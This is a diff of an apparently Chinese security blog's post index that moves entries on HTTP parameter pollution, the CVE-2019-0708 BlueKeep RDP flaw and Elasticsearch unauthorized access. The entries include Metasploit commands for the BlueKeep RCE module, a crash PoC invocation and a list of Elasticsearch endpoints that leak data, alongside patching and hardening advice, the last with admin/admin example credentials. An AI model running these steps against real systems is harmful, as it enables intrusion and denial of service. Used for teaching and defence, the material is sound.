-<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
-<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
-<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
-<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
-<table>
-<thead>
-<tr>
-<th align="center">web服务器</th>
-<th align="center">获取参数函数</th>
-<th align="center">获取到的参数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">PHP/Apache</td>
-<td align="center">$_GET(“test”)</td>
-<td align="center">last</td>
-</tr>
-<tr>
-<td align="center">JSP/Tomcat</td>
-<td align="center">Request.getParameter(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Perl(CGI)/Apache</td>
-<td align="center">Param(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Python/Apache</td>
-<td align="center">getvalue(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-<tr>
-<td align="center">ASP/IIS</td>
-<td align="center">Request.QueryString(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-</tbody></table>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
-<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>低危漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
     <url>//67bda6fdaf83.html</url>
     <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
@@ -1985,6 +2259,49 @@
         <tag>跨站类漏洞</tag>
         <tag>中危漏洞</tag>
         <tag>第三方库漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
+    <url>//ddf32da2222d.html</url>
+    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
+<li>Windows 7</li>
+<li>Windows server 2008 R2</li>
+<li>Windows server 2008</li>
+<li>Windows 2003</li>
+<li>Windows xp</li>
+</ul>
+<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
+<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
+
+<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
+<p>2.安装安全管家类的软件</p>
+<p>3.关闭远程桌面，开启防火墙</p>
+<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2085,46 +2402,77 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
-    <url>//ddf32da2222d.html</url>
-    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>Windows 7</li>
-<li>Windows server 2008 R2</li>
-<li>Windows server 2008</li>
-<li>Windows 2003</li>
-<li>Windows xp</li>
-</ul>
-<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
-<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
+    <title>Elasticsearch未授权访问</title>
+    <url>//9db3aff65775.html</url>
+    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
+<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
+<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
+<p>返回内容包含<code>You Know,for Search</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;_cat</span><br><span class="line">&#x2F;_cat&#x2F;allocation</span><br><span class="line">&#x2F;_cat&#x2F;shards</span><br><span class="line">&#x2F;_cat&#x2F;shards&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;master</span><br><span class="line">&#x2F;_cat&#x2F;nodes</span><br><span class="line">&#x2F;_cat&#x2F;tasks</span><br><span class="line">&#x2F;_cat&#x2F;indices</span><br><span class="line">&#x2F;_cat&#x2F;indices&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;segments</span><br><span class="line">&#x2F;_cat&#x2F;segments&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;count</span><br><span class="line">&#x2F;_cat&#x2F;count&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;recovery</span><br><span class="line">&#x2F;_cat&#x2F;recovery&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;health</span><br><span class="line">&#x2F;_cat&#x2F;pending_tasks</span><br><span class="line">&#x2F;_cat&#x2F;aliases</span><br><span class="line">&#x2F;_cat&#x2F;aliases&#x2F;&#123;alias&#125;</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool&#x2F;&#123;thread_pools&#125;</span><br><span class="line">&#x2F;_cat&#x2F;plugins</span><br><span class="line">&#x2F;_cat&#x2F;fielddata</span><br><span class="line">&#x2F;_cat&#x2F;fielddata&#x2F;&#123;fields&#125;</span><br><span class="line">&#x2F;_cat&#x2F;nodeattrs</span><br><span class="line">&#x2F;_cat&#x2F;repositories</span><br><span class="line">&#x2F;_cat&#x2F;snapshots&#x2F;&#123;repository&#125;</span><br><span class="line">&#x2F;_cat&#x2F;templates</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors&#x2F;&#123;job_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models&#x2F;&#123;model_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds&#x2F;&#123;datafeed_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics&#x2F;&#123;id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;transforms</span><br><span class="line">&#x2F;_cat&#x2F;transforms&#x2F;&#123;transform_id&#125;</span><br><span class="line">&#x2F;_river&#x2F;_searc</span><br><span class="line">&#x2F;_river&#x2F;_search 查看数据库敏感信息</span><br><span class="line">&#x2F;_nodes 查看节点数据</span><br><span class="line">&#x2F;_plugin&#x2F;head&#x2F;  如有安装head插件 web管理界面</span><br><span class="line">&#x2F;_search?pretty&#x3D;true 查询所有index,type</span><br><span class="line">&#x2F;index&#x2F;_search	查询某个index下所有type</span><br><span class="line">&#x2F;index&#x2F;type&#x2F;_search?pretty&#x3D;true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
+<p>2.禁止外网访问</p>
+<p>3.认证插件安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;plugins&#x2F;http-basic  &#x2F;&#x2F;es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https:&#x2F;&#x2F;github.com&#x2F;Asquera&#x2F;elasticsearch-http-basic&#x2F;releases&#x2F;download&#x2F;v1.1.0&#x2F;elasticsearch-http-basic-1.1.0.jar  &#x2F;&#x2F;下载es认证插件</span><br></pre></td></tr></table></figure>
 
-<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
+<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>
 
-<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
-<p>2.安装安全管家类的软件</p>
-<p>3.关闭远程桌面，开启防火墙</p>
-<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
+<table>
+<thead>
+<tr>
+<th align="center">配置名</th>
+<th align="center">默认值</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">http.basic.enabled</td>
+<td align="center">true</td>
+<td align="center">开关，开启会接管全部HTTP连接</td>
+</tr>
+<tr>
+<td align="center">http.basic.user</td>
+<td align="center">“admin”</td>
+<td align="center">账号</td>
+</tr>
+<tr>
+<td align="center">http.basic.password</td>
+<td align="center">“admin”</td>
+<td align="center">密码</td>
+</tr>
+<tr>
+<td align="center">http.basic.ipwhitelist</td>
+<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
+<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
+</tr>
+<tr>
+<td align="center">http.basic.trusted_proxy_chains</td>
+<td align="center">[“172.16.18.114”]</td>
+<td align="center">信任代理列表</td>
+</tr>
+<tr>
+<td align="center">http.basic.log</td>
+<td align="center">false</td>
+<td align="center">把无授权的访问事件添加到ES的日志</td>
+</tr>
+<tr>
+<td align="center">http.basic.xforward</td>
+<td align="center">“X-Forwarded-For”</td>
+<td align="center">记载代理路径的header字段名</td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>漏洞利用</category>
-        <category>常见漏洞</category>
+        <category>服务器应用漏洞</category>
+        <category>未授权访问漏洞</category>
       </categories>
       <tags>
-        <tag>高危漏洞</tag>
-        <tag>代码执行漏洞</tag>
+        <tag>未授权访问</tag>
       </tags>
   </entry>
   <entry>
@@ -2411,80 +2759,6 @@
       </categories>
       <tags>
         <tag>命令执行</tag>
-        <tag>未授权访问</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Elasticsearch未授权访问</title>
-    <url>//9db3aff65775.html</url>
-    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
-<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
-<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
-<p>返回内容包含<code>You Know,for Search</code></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;_cat</span><br><span class="line">&#x2F;_cat&#x2F;allocation</span><br><span class="line">&#x2F;_cat&#x2F;shards</span><br><span class="line">&#x2F;_cat&#x2F;shards&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;master</span><br><span class="line">&#x2F;_cat&#x2F;nodes</span><br><span class="line">&#x2F;_cat&#x2F;tasks</span><br><span class="line">&#x2F;_cat&#x2F;indices</span><br><span class="line">&#x2F;_cat&#x2F;indices&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;segments</span><br><span class="line">&#x2F;_cat&#x2F;segments&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;count</span><br><span class="line">&#x2F;_cat&#x2F;count&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;recovery</span><br><span class="line">&#x2F;_cat&#x2F;recovery&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;health</span><br><span class="line">&#x2F;_cat&#x2F;pending_tasks</span><br><span class="line">&#x2F;_cat&#x2F;aliases</span><br><span class="line">&#x2F;_cat&#x2F;aliases&#x2F;&#123;alias&#125;</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool&#x2F;&#123;thread_pools&#125;</span><br><span class="line">&#x2F;_cat&#x2F;plugins</span><br><span class="line">&#x2F;_cat&#x2F;fielddata</span><br><span class="line">&#x2F;_cat&#x2F;fielddata&#x2F;&#123;fields&#125;</span><br><span class="line">&#x2F;_cat&#x2F;nodeattrs</span><br><span class="line">&#x2F;_cat&#x2F;repositories</span><br><span class="line">&#x2F;_cat&#x2F;snapshots&#x2F;&#123;repository&#125;</span><br><span class="line">&#x2F;_cat&#x2F;templates</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors&#x2F;&#123;job_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models&#x2F;&#123;model_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds&#x2F;&#123;datafeed_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics&#x2F;&#123;id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;transforms</span><br><span class="line">&#x2F;_cat&#x2F;transforms&#x2F;&#123;transform_id&#125;</span><br><span class="line">&#x2F;_river&#x2F;_searc</span><br><span class="line">&#x2F;_river&#x2F;_search 查看数据库敏感信息</span><br><span class="line">&#x2F;_nodes 查看节点数据</span><br><span class="line">&#x2F;_plugin&#x2F;head&#x2F;  如有安装head插件 web管理界面</span><br><span class="line">&#x2F;_search?pretty&#x3D;true 查询所有index,type</span><br><span class="line">&#x2F;index&#x2F;_search	查询某个index下所有type</span><br><span class="line">&#x2F;index&#x2F;type&#x2F;_search?pretty&#x3D;true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
-<p>2.禁止外网访问</p>
-<p>3.认证插件安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;plugins&#x2F;http-basic  &#x2F;&#x2F;es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https:&#x2F;&#x2F;github.com&#x2F;Asquera&#x2F;elasticsearch-http-basic&#x2F;releases&#x2F;download&#x2F;v1.1.0&#x2F;elasticsearch-http-basic-1.1.0.jar  &#x2F;&#x2F;下载es认证插件</span><br></pre></td></tr></table></figure>
-
-<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th align="center">配置名</th>
-<th align="center">默认值</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">http.basic.enabled</td>
-<td align="center">true</td>
-<td align="center">开关，开启会接管全部HTTP连接</td>
-</tr>
-<tr>
-<td align="center">http.basic.user</td>
-<td align="center">“admin”</td>
-<td align="center">账号</td>
-</tr>
-<tr>
-<td align="center">http.basic.password</td>
-<td align="center">“admin”</td>
-<td align="center">密码</td>
-</tr>
-<tr>
-<td align="center">http.basic.ipwhitelist</td>
-<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
-<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
-</tr>
-<tr>
-<td align="center">http.basic.trusted_proxy_chains</td>
-<td align="center">[“172.16.18.114”]</td>
-<td align="center">信任代理列表</td>
-</tr>
-<tr>
-<td align="center">http.basic.log</td>
-<td align="center">false</td>
-<td align="center">把无授权的访问事件添加到ES的日志</td>
-</tr>
-<tr>
-<td align="center">http.basic.xforward</td>
-<td align="center">“X-Forwarded-For”</td>
-<td align="center">记载代理路径的header字段名</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>服务器应用漏洞</category>
-        <category>未授权访问漏洞</category>
-      </categories>
-      <tags>
         <tag>未授权访问</tag>
       </tags>
   </entry>
